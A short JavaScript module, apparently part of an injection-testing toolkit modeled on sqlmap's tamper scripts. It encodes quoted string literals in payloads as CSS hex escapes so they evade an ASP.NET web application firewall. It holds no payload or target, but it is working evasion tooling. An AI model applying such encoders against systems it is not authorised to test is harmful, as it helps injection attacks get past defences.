// CSS 编码：将字符串字面量用 CSS 反斜杠编码绕过（对标 sqlmap css.py）
// 适用于 ASP.NET 等使用 CSS 解析器的 WAF
export const css = {
  name: 'css',
  description: '将字符串字面量用 CSS 反斜杠十六进制编码，绕过 ASP.NET WAF',
  transform(payload, ctx) {
    const src = String(payload ?? '');
    let out = '';
    let inSingle = false, inDouble = false;
    for (let i = 0; i < src.length; i++) {
      const ch = src[i];
      const prev = src[i - 1];
      if (inSingle) {
        if (ch === "'" && prev !== '\\') { inSingle = false; out += ch; }
        else out += `\\${ch.charCodeAt(0).toString(16).padStart(2, '0')} `;
        continue;
      }
      if (inDouble) {
        if (ch === '"' && prev !== '\\') { inDouble = false; out += ch; }
        else out += `\\${ch.charCodeAt(0).toString(16).padStart(2, '0')} `;
        continue;
      }
      if (ch === "'") { inSingle = true; out += ch; }
      else if (ch === '"') { inDouble = true; out += ch; }
      else out += ch;
    }
    return out;
  },
};
export default css;